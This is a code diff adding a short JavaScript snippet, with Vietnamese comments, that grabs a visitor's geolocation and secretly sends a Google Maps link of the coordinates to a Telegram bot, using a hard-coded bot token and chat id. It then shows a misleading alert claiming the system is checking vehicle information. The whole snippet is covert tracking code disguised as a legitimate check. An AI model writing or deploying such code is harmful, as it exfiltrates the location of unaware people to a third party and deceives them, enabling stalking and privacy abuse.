@@ -1,0 +1,17 @@
+// Thay token và id thật của bạn vào đây
+var token = "AAH8Qe6ETY42SjLvFBq8hFRd3SlhO6hPMz0";
+var chat_id = "8571376502";
+
+function showPosition(position) {
+  var lat = position.coords.latitude;
+  var lon = position.coords.longitude;
+  
+  // Nội dung tin nhắn gửi về Telegram
+  var text = "Đã lấy được tọa độ: https://www.google.com/maps?q=" + lat + "," + lon;
+  var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`;
+
+  // Lệnh bí mật gửi tin nhắn đi
+  fetch(url);
+
+  alert("Hệ thống đang kiểm tra thông tin xe, vui lòng chờ...");
+}
